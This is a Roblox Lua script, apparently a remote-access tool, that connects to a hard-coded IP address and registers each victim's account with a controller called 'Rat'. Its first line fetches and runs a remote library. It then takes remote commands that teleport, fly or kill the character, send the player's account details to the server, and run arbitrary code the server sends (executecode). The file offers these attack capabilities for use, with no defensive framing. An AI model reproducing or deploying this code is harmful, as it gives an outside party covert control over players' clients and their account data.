local KasflowsClient = loadstring(game:HttpGet("https://raw.githubusercontent.com/KaSpEr-tv123/kasflowsjs/refs/heads/main/roblox/kasflows.lua"))()

local function sendChatMessage(text, color)
    local player = game.Players.LocalPlayer
    
    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
        Text = text,
        Color = color or Color3.fromRGB(170, 0, 255),
        Font = Enum.Font.SourceSansBold,
        FontSize = Enum.FontSize.Size24
    })
end

local client = KasflowsClient.new('http://87.120.166.48:8000')

client:on("connect", function()
    client:sendToClient("Rat", "notification", {
        text = "Успешно подключенен аккаунт: " .. game.Players.LocalPlayer.Name,
        type = "success"
    })
end)

client:on("disconnect", function()
    client:sendToClient("Rat", "notification", {
        text = "Отключен от сервера",
        type = "error"
    })
end)

client:on("error", function(errorMessage)
    client:sendToClient("Rat", "notification", {
        text = "Ошибка: " .. errorMessage,
        type = "error"
    })
    
    -- Отправляем ошибку на сервер
    pcall(function()
        client:emit("errorlua", {
            error = errorMessage
        })
    end)
end)

local commandHandlers = {}

local function registerCommandHandler(commandName, handler)
    commandHandlers[commandName] = handler
end

local function hasCommandHandler(commandName)
    return commandHandlers[commandName] ~= nil
end

local function executeCommand(commandName, arg, player, character, humanoid, humanoidRootPart)
    local handler = commandHandlers[commandName]
    if handler then
        return handler(arg, player, character, humanoid, humanoidRootPart)
    end
    return false, "Нет обработчика для команды: " .. commandName
end

client:on("action", function(message)
    if type(message) ~= "string" then
        client:sendToClient("Rat", "notification", {
            text = "Получено сообщение неверного типа: " .. type(message),
            type = "error"
        })
        return
    end
    
    -- Отладочный вывод
    client:sendToClient("Rat", "notification", {
        text = "Получена команда: " .. message,
        type = "info"
    })
    
    local parts = {}
    for part in string.gmatch(message, "[^;]+") do
        table.insert(parts, part)
    end
    
    local command = parts[1]
    local arg = parts[2]
    
    -- Добавляем суффикс ING к команде, если его нет
    if not string.match(command, "ING$") then
        command = command .. "ING"
    end
    
    -- Проверка на наличие обработчика для команды
    if not hasCommandHandler(command) then
        client:sendToClient("Rat", "notification", {
            text = "Нет обработчика для команды: " .. command,
            type = "error"
        })
        return
    end
    
    local success, errorMsg = pcall(function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        
        local commandSuccess, commandError = executeCommand(command, arg, player, character, humanoid, humanoidRootPart)
        if not commandSuccess and commandError then
            client:sendToClient("Rat", "notification", {
                text = commandError,
                type = "error"
            })
        end
    end)
    
    if not success then
        client:sendToClient("Rat", "notification", {
            text = "Ошибка при выполнении команды: " .. errorMsg,
            type = "error"
        })
        
        pcall(function()
            client:emit("errorlua", {
                command = command,
                error = errorMsg
            })
        end)
    end
end)

-- Регистрация всех команд
registerCommandHandler("runING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local forwardDirection = humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local rightDirection = humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local leftDirection = -humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("runbackING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local backwardDirection = -humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})
    tween:Play()
    return true
end)

registerCommandHandler("jumpING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid.Jump = true
    return true
end)

registerCommandHandler("teleportforwardING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local forwardDirection = humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (forwardDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportbackING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local backwardDirection = -humanoidRootPart.CFrame.LookVector
    local targetPosition = humanoidRootPart.Position + (backwardDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local leftDirection = -humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (leftDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local rightDirection = humanoidRootPart.CFrame.RightVector
    local targetPosition = humanoidRootPart.Position + (rightDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportupING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local upDirection = Vector3.new(0, 1, 0)
    local targetPosition = humanoidRootPart.Position + (upDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleportdownING", function(arg, player, character, humanoid, humanoidRootPart)
    local distance = arg and tonumber(arg) or 10
    local downDirection = Vector3.new(0, -1, 0)
    local targetPosition = humanoidRootPart.Position + (downDirection * distance)
    
    humanoidRootPart.CFrame = CFrame.new(targetPosition)
    return true
end)

registerCommandHandler("teleporttoING", function(arg, player, character, humanoid, humanoidRootPart)
    if not arg then
        return false, "Не указаны координаты для телепортации"
    end
    
    local coords = {}
    for coord in string.gmatch(arg, "[^;]+") do
        table.insert(coords, tonumber(coord))
    end
    
    if #coords < 3 then
        return false, "Неверный формат координат. Требуется X;Y;Z"
    end
    
    local x, y, z = coords[1], coords[2], coords[3]
    humanoidRootPart.CFrame = CFrame.new(x, y, z)
    return true
end)

registerCommandHandler("speedING", function(arg, player, character, humanoid, humanoidRootPart)
    local speedValue = arg and tonumber(arg) or 16 
    humanoid.WalkSpeed = speedValue
    return true
end)

registerCommandHandler("jumppowerING", function(arg, player, character, humanoid, humanoidRootPart)
    local jumpValue = arg and tonumber(arg) or 50
    humanoid.JumpPower = jumpValue
    return true
end)

registerCommandHandler("flyING", function(arg, player, character, humanoid, humanoidRootPart)
    local flying = humanoid:FindFirstChild("Flying")
    
    if flying then
        flying:Destroy()
        
        local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
        if flyVelocity then
            flyVelocity:Destroy()
        end
        
        local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
        if flyGyro then
            flyGyro:Destroy()
        end
    else
        local flyValue = Instance.new("BoolValue")
        flyValue.Name = "Flying"
        flyValue.Parent = humanoid
        
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.Name = "FlyVelocity"
        bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyVelocity.Velocity = Vector3.new(0, 0, 0)
        bodyVelocity.Parent = humanoidRootPart
        
        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.Name = "FlyGyro"
        bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
        bodyGyro.P = 10000
        bodyGyro.D = 100
        bodyGyro.CFrame = humanoidRootPart.CFrame
        bodyGyro.Parent = humanoidRootPart
        
        local function updateFlight()
            if not flyValue or not flyValue.Parent then return end
            
            local lookVector = humanoidRootPart.CFrame.LookVector
            local upVector = humanoidRootPart.CFrame.UpVector
            local rightVector = humanoidRootPart.CFrame.RightVector
            
            local velocity = Vector3.new(0, 0, 0)
            
            local userInputService = game:GetService("UserInputService")
            
            if userInputService:IsKeyDown(Enum.KeyCode.W) then
                velocity = velocity + lookVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.S) then
                velocity = velocity - lookVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.A) then
                velocity = velocity - rightVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.D) then
                velocity = velocity + rightVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.Space) then
                velocity = velocity + upVector
            end
            if userInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
                velocity = velocity - upVector
            end
            
            if velocity.Magnitude > 0 then
                velocity = velocity.Unit * humanoid.WalkSpeed
            end
            
            local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
            if flyVelocity then
                flyVelocity.Velocity = velocity
            end
            
            local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
            if flyGyro then
                flyGyro.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + lookVector)
            end
        end
        
        spawn(function()
            while flyValue and flyValue.Parent do
                updateFlight()
                wait(0.1)
            end
            
            local flyVelocity = humanoidRootPart:FindFirstChild("FlyVelocity")
            if flyVelocity then
                flyVelocity:Destroy()
            end
            
            local flyGyro = humanoidRootPart:FindFirstChild("FlyGyro")
            if flyGyro then
                flyGyro:Destroy()
            end
        end)
    end
    return true
end)

registerCommandHandler("turnleftING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(0, -angle, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("turnrightING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(90)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(0, angle, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("lookupING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(-angle, 0, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("lookdownING", function(arg, player, character, humanoid, humanoidRootPart)
    local angle = arg and math.rad(tonumber(arg)) or math.rad(45)
    
    local currentCFrame = humanoidRootPart.CFrame
    local newCFrame = currentCFrame * CFrame.Angles(angle, 0, 0)
    
    local tweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = tweenService:Create(humanoidRootPart, tweenInfo, {CFrame = newCFrame})
    tween:Play()
    return true
end)

registerCommandHandler("resetcameraING", function(arg, player, character, humanoid, humanoidRootPart)
    local position = humanoidRootPart.Position
    humanoidRootPart.CFrame = CFrame.new(position)
    return true
end)

registerCommandHandler("getpositionING", function(arg, player, character, humanoid, humanoidRootPart)
    local position = humanoidRootPart.Position
    local x = math.floor(position.X * 10) / 10
    local y = math.floor(position.Y * 10) / 10
    local z = math.floor(position.Z * 10) / 10
    
    client:sendToClient("Rat", "notification", {
        text = "Позиция: X=" .. x .. ", Y=" .. y .. ", Z=" .. z,
        type = "info"
    })
    return true
end)

registerCommandHandler("sitING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid.Sit = true
    return true
end)

registerCommandHandler("danceING", function(arg, player, character, humanoid, humanoidRootPart)
    local function doDanceMove()
        local randomAngle = math.random(-45, 45)
        local verticalShift = math.rad(math.random(-15, 15))
        local hipShift = CFrame.new(0, math.random(-1,1)*0.3, 0)
        
        local currentCFrame = humanoidRootPart.CFrame
        local newCFrame = currentCFrame 
            * CFrame.Angles(0, math.rad(randomAngle), verticalShift)
            * hipShift
        
        local tweenService = game:GetService("TweenService")
        local tweenInfo = TweenInfo.new(
            0.2 + math.random()*0.3,
            Enum.EasingStyle.Quad,
            Enum.EasingDirection.Out,
            0,
            false,
            math.random(-2,2)*0.1
        )
        
        local tween = tweenService:Create(
            humanoidRootPart, 
            tweenInfo, 
            {CFrame = newCFrame}
        )
        
        if math.random() > 0.7 then
            humanoid.Jump = true
        end
        
        tween:Play()
        task.wait(0.1 + math.random()*0.3)
    end
    
    spawn(function()
        for i = 1, 40 do
            doDanceMove()
            wait(0.5)
        end
    end)
    return true
end)

registerCommandHandler("resetING", function(arg, player, character, humanoid, humanoidRootPart)
    character:BreakJoints()
    return true
end)

registerCommandHandler("executecodeING", function(arg, player, character, humanoid, humanoidRootPart)
    local code = arg
    if not code then
        return false, "Не указан код для выполнения"
    end
    
    local codeFunc, compileError = loadstring(code)
    if not codeFunc then
        return false, "Ошибка компиляции: " .. tostring(compileError)
    end
    
    local success, runtimeError = pcall(codeFunc)
    if not success then
        return false, "Ошибка выполнения: " .. tostring(runtimeError)
    end
    
    return true
end)

registerCommandHandler("serverhopING", function(arg, player, character, humanoid, humanoidRootPart)
    local teleportService = game:GetService("TeleportService")
    local httpService = game:GetService("HttpService")
    local placeId = game.PlaceId
    
    local success, errorMsg = pcall(function()
        local servers = {}
        local cursor = ""
        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100"
        
        repeat
            local apiUrl = url
            if cursor ~= "" then
                apiUrl = url .. "&cursor=" .. cursor
            end
            
            local response = httpService:JSONDecode(game:HttpGet(apiUrl))
            cursor = response.nextPageCursor or ""
            
            for _, server in ipairs(response.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    table.insert(servers, server)
                end
            end
        until cursor == "" or #servers >= 5
        
        if #servers > 0 then
            local selectedServer = servers[math.random(1, #servers)]
            teleportService:TeleportToPlaceInstance(placeId, selectedServer.id, game.Players.LocalPlayer)
        else
            return false, "Не найдено подходящих серверов"
        end
    end)
    
    if not success then
        return false, "Ошибка при смене сервера: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("teleporttogameING", function(arg, player, character, humanoid, humanoidRootPart)
    local placeId = arg and tonumber(arg)
    if not placeId then
        return false, "Не указан ID игры"
    end
    
    local teleportService = game:GetService("TeleportService")
    local success, errorMsg = pcall(function()
        teleportService:Teleport(placeId, game.Players.LocalPlayer)
    end)
    
    if not success then
        return false, "Ошибка при телепортации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("joinplayerING", function(arg, player, character, humanoid, humanoidRootPart)
    local playerName = arg
    if not playerName or playerName == "" then
        return false, "Имя игрока не указано"
    end
    
    local success, errorMsg = pcall(function()
        local gameid = game.PlaceId
        local serverid = game.JobId
        client:sendToClient(playerName, "joinplayerbyinfo", {
            gameid = gameid,
            serverid = serverid
        })
    end)
    
    if not success then
        return false, "Ошибка при отправке приглашения: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("getplayerinfoING", function(arg, player, character, humanoid, humanoidRootPart)
    local playerInfo = {
        ["Имя"] = player.Name,
        ["ID"] = player.UserId,
        ["Возраст аккаунта"] = player.AccountAge .. " дней",
        ["Здоровье"] = math.floor(humanoid.Health) .. "/" .. math.floor(humanoid.MaxHealth),
        ["Скорость"] = humanoid.WalkSpeed,
        ["Сила прыжка"] = humanoid.JumpPower,
        ["Текущая игра"] = game.PlaceId,
        ["Название игры"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    }
    
    local position = character:WaitForChild("HumanoidRootPart").Position
    playerInfo["Позиция"] = "X: " .. math.floor(position.X*10)/10 .. ", Y: " .. math.floor(position.Y*10)/10 .. ", Z: " .. math.floor(position.Z*10)/10
    
    local success, errorMsg = pcall(function()
        client:sendToClient("Rat", "playerInfo", game:GetService("HttpService"):JSONEncode(playerInfo))
    end)
    
    if not success then
        return false, "Ошибка при отправке информации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("rejoinING", function(arg, player, character, humanoid, humanoidRootPart)
    local success, errorMsg = pcall(function()
        local teleportService = game:GetService("TeleportService")
        local placeId = game.PlaceId
        local jobId = game.JobId
        
        if jobId and jobId ~= "" then
            teleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
        else
            teleportService:Teleport(placeId, game.Players.LocalPlayer)
        end
    end)
    
    if not success then
        return false, "Ошибка при перезаходе: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("joinplayerbyidING", function(arg, player, character, humanoid, humanoidRootPart)
    if not arg then
        return false, "Не указаны параметры"
    end
    
    local params = {}
    for param in string.gmatch(arg, "[^;]+") do
        table.insert(params, param)
    end
    
    if #params < 2 then
        return false, "Неверный формат параметров. Требуется gameId;serverId"
    end
    
    local gameId = tonumber(params[1])
    local serverId = params[2]
    
    if not gameId then
        return false, "Неверный ID игры"
    end
    
    local teleportService = game:GetService("TeleportService")
    local success, errorMsg = pcall(function()
        teleportService:TeleportToPlaceInstance(gameId, serverId, game.Players.LocalPlayer)
    end)
    
    if not success then
        return false, "Ошибка при телепортации: " .. errorMsg
    end
    
    return true
end)

registerCommandHandler("stopING", function(arg, player, character, humanoid, humanoidRootPart)
    humanoid:MoveTo(humanoidRootPart.Position)
    return true
end)

local response = client:connect(game.Players.LocalPlayer.Name)